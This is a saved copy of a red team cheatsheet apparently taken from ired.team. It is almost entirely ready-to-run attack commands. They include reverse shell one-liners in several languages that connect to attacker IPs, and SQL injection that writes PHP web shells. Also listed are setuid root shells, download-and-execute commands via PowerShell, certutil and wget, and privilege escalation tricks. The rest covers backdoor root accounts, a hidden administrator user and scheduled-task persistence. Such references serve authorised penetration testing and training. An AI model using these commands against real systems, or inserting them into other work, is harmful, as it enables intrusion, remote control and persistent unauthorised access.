# 🔴 Red Team Cheatsheet (by ired.team)

**Source:** https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets
**Saved by:** Nxlebot
**Date:** 2026-04-08

---

## 🕵️ Reconnaissance / Enumeration

### Extracting Live IPs from Nmap Scan
```bash
nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep "/open" | cut -d " " -f 2 > exposed-services-ips
```

### Simple Port Knocking
```bash
for x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x 1.1.1.1; done
```

### DNS lookups, Zone Transfers & Brute-Force
```bash
whois domain.com
dig {a|txt|ns|mx} domain.com
dig {a|txt|ns|mx} domain.com @ns1.domain.com
host -t {a|txt|ns|mx} megacorpone.com
host -a megacorpone.com
host -l megacorpone.com ns1.megacorpone.com
dnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.com
dnsenum domain.com
nslookup -> set type=any -> ls -d domain.com
for sub in $(cat subdomains.txt);do host $sub.domain.com|grep "has.address";done
```

### Banner Grabbing
```bash
nc -v $TARGET 80
telnet $TARGET 80
curl -vX $TARGET
```

### NFS Exported Shares
List NFS exported shares:
```bash
showmount -e 192.168.110.102
```
...and check if `'rw,no_root_squash'` is present. If it is present, compile the below `sid-shell.c`:

{% code title="sid-shell.c" %}
```cpp
#include <unistd.h>

main( int argc, char ** argv, char ** envp )
{
    setgid(0); setuid(0); system("/bin/bash", argv, envp);
    return 0;
}
```
{% endcode %}

...upload it to the share and execute the below to launch `sid-shell` to spawn a root shell:
```bash
chown root:root sid-shell; chmod +s sid-shell; ./sid-shell
```

### Kerberos Enumeration
```bash
# users
nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'
```

### HTTP Brute-Force & Vulnerability Scanning
```bash
target=10.0.0.1; gobuster -u http://$target -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150 -l | tee $target-gobuster
target=10.0.0.1; nikto -h http://$target:80 | tee $target-nikto
target=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum
```

### RPC / NetBios / SMB
```bash
rpcinfo -p $TARGET
nbtscan $TARGET

#list shares
smbclient -L //$TARGET -U ""

# null session
rpcclient -U "" $TARGET
smbclient -L //$TARGET
enum4linux $TARGET
```

### SNMP
```bash
# Windows User Accounts
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25

# Windows Running Programs
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2

# Windows Hostname
snmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5

# Windows Share Information
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1

# Windows Share Information
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.27

# Windows TCP Ports
snmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3

# Software Name
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2

# brute-force community strings
onesixtyone -i snmp-ips.txt -c community.txt

snmp-check $TARGET
```

### SMTP
```bash
smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150
```

### Active Directory
```powershell
# current domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# domain trusts
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# current forest info
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

# get forest trust relationships
([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()

# get DCs of a domain
nltest /dclist:offense.local
net group "domain controllers" /domain

# get DC for currently authenticated session
nltest /dsgetdc:offense.local

# get domain trusts from cmd shell
nltest /domain_trusts

# get user info
nltest /user:"spotless"

# get DC for currently authenticated session
set l

# get domain name and DC the user authenticated to
klist

# get all logon sessions. Includes NTLM authenticated sessions
klist sessions

# kerberos tickets for the session
klist

# cached krbtgt
klist tgt

# whoami on older Windows systems
set u

# find DFS shares with ADModule
Get-ADObject -filter * -SearchBase "CN=Dfs-Configuration,CN=System,DC=offense,DC=local" | select name

# find DFS shares with ADSI
$s=[adsisearcher]'(name=*)'; $s.SearchRoot = [adsi]"LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local"; $s.FindAll() | % {$_.properties.name}

# check if spooler service is running on a host
powershell ls "\\dc01\pipe\spoolss"
```

### Listen on a port (Powershell)
```csharp
# Start listener on port 443
$listener = [System.Net.Sockets.TcpListener]443; $listener.Start();
 
while($true)
{
    $client = $listener.AcceptTcpClient();
    Write-Host $client.client.RemoteEndPoint "connected!";
    $client.Close();
    start-sleep -seconds 1;
}
```

## 💉 Gaining Access

### Reverse Shell One-Liners

#### Bash
```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

#### Perl
```bash
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Python
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### PHP
```bash
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### Netcat without -e #1
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f
```

#### Java
```bash
r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();
```

### Generating Payload with msfvenom
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
```

### Compiling Code From Linux
```bash
# Windows
i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe

# Linux
gcc -m32|-m64 -o output source.c
```

### Bypassing File Upload Restrictions
* file.php -> file.jpg
* file.php -> file.php.jpg
* file.asp -> file.asp;.jpg
* file.gif (contains php code, but starts with string GIF/GIF98)
* 00%
* file.jpg with php backdoor in exif
* .jpg -> proxy intercept -> rename to .php

### Uploading .htaccess to interpret .blah as .php
```apache
AddType application/x-httpd-php .blah
```

### Cracking Passwords

#### Cracking Web Forms with Hydra
```bash
hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list "/endpoint/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s PORT -P /usr/share/wordlists/list
```

#### Cracking Common Protocols with Hydra
```bash
hydra 10.10.10.52 -l username -P /usr/share/wordlists/list ftp|ssh|smb://10.0.0.1
```

### SQL Injection to Shell or Backdoor
```sql
# Assumed 3 columns
http://target/index.php?vulnParam=0' UNION ALL SELECT 1,"<?php system($_REQUEST['cmd']);?>",2,3 INTO OUTFILE "c:/evil.php"-- uMj
```

```bash
# sqlmap; post-request - captured request via Burp Proxy via Save Item to File.
sqlmap -r post-request -p item --level=5 --risk=3 --dbms=mysql --os-shell --threads 10
```

### SQLite Injection to Shell or Backdoor
```sql
ATTACH DATABASE '/home/www/public_html/uploads/phpinfo.php' as pwn; 
CREATE TABLE pwn.shell (code TEXT); 
INSERT INTO pwn.shell (code) VALUES ('<?php system($_REQUEST['cmd']);?>');
```

## 🚀 Local Enumeration & Privilege Escalation

### Check AppLocker Policies
```powershell
Get-AppLockerPolicy -Local).RuleCollections
Get-ChildItem -Path HKLM:Software\Policies\Microsoft\Windows\SrpV2 -Recurse
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\
```

### Applocker: Writable Windows Directories
```
C:\Windows\Tasks
C:\Windows\Temp
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```

### MySQL User Defined Fuction Privilge Escalation
Requires raptor_udf2.c and sid-shell.c or full raptor.tar.

```sql
use mysql;
create table npn(line blob);
insert into npn values(load_file('/tmp/raptor_udf2.so'));
select * from npn into dumpfile '/usr/lib/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell');
```

### Docker Privilege Esclation
```bash
echo -e "FROM ubuntu:14.04\nENV WORKDIR /stuff\nRUN mkdir -p /stuff\nVOLUME [ /stuff ]\nWORKDIR /stuff" > Dockerfile && docker build -t my-docker-image . && docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh' && ./sh -c id && ./sh
```

### Resetting root Password
```bash
echo "root:spotless" | chpasswd
```

## 📤 Uploading Files to Target Machine

### TFTP
```bash
#TFTP Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp
service atftpd start

# Windows
tftp -i $ATTACKER get /download/location/file /save/location/file
```

### FTP
```bash
# Linux: set up ftp server with anonymous logon access;
twistd -n ftp -p 21 -r /file/to/serve

# Windows shell: read FTP commands from ftp-commands.txt non-interactively;
echo open $ATTACKER>ftp-commands.txt
echo anonymous>>ftp-commands.txt
echo whatever>>ftp-commands.txt
echo binary>>ftp-commands.txt
echo get file.exe>>ftp-commands.txt
echo bye>>ftp-commands.txt 
ftp -s:ftp-commands.txt

# Or just a one-liner
(echo open 10.11.0.245&echo anonymous&echo whatever&echo binary&echo get nc.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & nc.exe 10.11.0.245 443 -e cmd
```

### CertUtil
```csharp
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
```

### PHP
```php
<?php file_put_contents("/var/tmp/shell.php", file_get_contents("http://10.11.0.245/shell.php")); ?>
```

### Python
```python
python -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')"
```

### HTTP: Powershell
```csharp
powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe" }
powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'" }
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe')"; Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'"
powershell (New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/file.exe','file.exe');(New-Object -com Shell.Application).ShellExecute('file.exe');

# download using default proxy credentials and launch
powershell -command { $b=New-Object System.Net.WebClient; $b.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $b.DownloadString("http://$attacker/nc.exe") | Out-File nc.exe; Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'" }
```

### HTTP: Linux
```bash
wget http://$ATTACKER/file
curl http://$ATTACKER/file -O
scp ~/file/file.bin user@$TARGET:tmp/backdoor.py
```

### NetCat
```bash
# Attacker
nc -l -p 4444 < /tool/file.exe

# Victim
nc $ATTACKER 4444 > file.exe
```

## 🕸️ Post-Exploitation & Maintaining Access

### Creating User and Adding to Local Administrators
```bash
net user spotless spotless /add & net localgroup Administrators spotless /add
```

### Hide Newly Created Local administrator
```erlang
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v spotless /d 0 /f
```

### Creating SSH Authorized Keys
```bash
mkdir /root/.ssh 2>/dev/null; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQChKCUsFVWj1Nz8SiM01Zw/BOWcMNs2Zwz3MdT7leLU9/Un4mZ7vjco0ctsyh2swjphWr5WZG28BN90+tkyj3su23UzrlgEu3SaOjVgxhkx/Pnbvuua9Qs9gWbWyRxexaC1eDb0pKXHH2Msx+GlyjfDOngq8tR6tkU8u1S4lXKLejaptiz0q6P0CcR6hD42IYkqyuWTNrFdSGLtiPCBDZMZ/5g1cJsyR59n54IpV0b2muE3F7+NPQmLx57IxoPjYPNUbC6RPh/Saf7o/552iOcmVCdLQDR/9I+jdZIgrOpstqSiJooU9+JImlUtAkFxZ9SHvtRbFt47iH7Sh7LiefP5 root@kali' >> /root/.ssh/authorized_keys
```

### Creating Backdoor User w/o Password
```bash
echo 'spotless::0:0:root:/root:/bin/bash' >> /etc/passwd
```

### Creating Another root User
```bash
useradd -u0 -g0 -o -s /bin/bash -p `openssl passwd yourpass` rootuser
```

### Generating OpenSSL Password
```bash
openssl passwd -1 password 
# output $1$YKbEkrkZ$7Iy/M3exliD/yJfJVeTn5.
```

### Persistent Back Doors
```
# Launch evil.exe every 10 minutes
schtasks /create /sc minute /mo 10 /tn "TaskName" /tr C:\Windows\system32\evil.exe
```

---
*Source: ired.team / Dostoevsky's Pentest Notes*
